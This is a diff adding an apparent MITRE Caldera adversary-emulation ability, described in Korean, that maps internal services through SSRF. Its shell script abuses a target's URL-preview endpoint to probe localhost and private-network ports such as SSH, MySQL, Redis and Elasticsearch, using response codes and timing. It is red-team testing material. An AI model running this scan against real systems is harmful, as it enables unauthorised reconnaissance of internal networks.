@@ -1,0 +1,56 @@
+- id: e2a3b4c5-d6e7-f8a9-b0c1-d2e3f4a5b6c7
+  name: SSRF - Internal Port Scanning
+  description: URL 미리보기 기능을 악용하여 내부 네트워크의 서비스 포트를 스캔합니다. localhost와 내부 IP 대역(10.x, 172.16.x, 192.168.x)의 주요 포트에 요청을 보내 응답 차이로 서비스 존재 여부를 파악합니다.
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: Network Service Discovery
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1046"
+          ABILITY_ID="e2a3b4c5-d6e7-f8a9-b0c1-d2e3f4a5b6c7"
+          TARGET="http://#{target.url}"
+
+          # 주요 내부 서비스 포트
+          INTERNAL_TARGETS=(
+            "http://127.0.0.1:22"       # SSH
+            "http://127.0.0.1:3306"     # MySQL
+            "http://127.0.0.1:5432"     # PostgreSQL
+            "http://127.0.0.1:6379"     # Redis
+            "http://127.0.0.1:9200"     # Elasticsearch
+            "http://127.0.0.1:8080"     # Internal HTTP
+            "http://10.0.0.1:80"        # Internal gateway
+            "http://192.168.1.1:443"    # Router/firewall
+          )
+
+          LABELS=(
+            "localhost:22 (SSH)"
+            "localhost:3306 (MySQL)"
+            "localhost:5432 (PostgreSQL)"
+            "localhost:6379 (Redis)"
+            "localhost:9200 (Elasticsearch)"
+            "localhost:8080 (Internal HTTP)"
+            "10.0.0.1:80 (Internal gateway)"
+            "192.168.1.1:443 (Router)"
+          )
+
+          echo "[*] SSRF Port Scan — probing internal services via URL preview"
+          for i in "${!INTERNAL_TARGETS[@]}"; do
+            ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${INTERNAL_TARGETS[$i]}', safe=''))")
+            START=$(date +%s%N)
+            HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
+              -H "X-Caldera-Op-Id: ${OP_ID}" \
+              -H "X-Caldera-Technique: ${TECH_ID}" \
+              -H "X-Caldera-Ability: ${ABILITY_ID}" \
+              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
+              "${TARGET}/api/preview?url=${ENCODED}")
+            END=$(date +%s%N)
+            ELAPSED=$(( (END - START) / 1000000 ))
+            echo "[+] ${LABELS[$i]} → HTTP ${HTTP_CODE} (${ELAPSED}ms)"
+          done
+        parsers:
+          plugins.stockpile.app.parsers.basic:
+          - source: host.vuln.ssrf.portscan
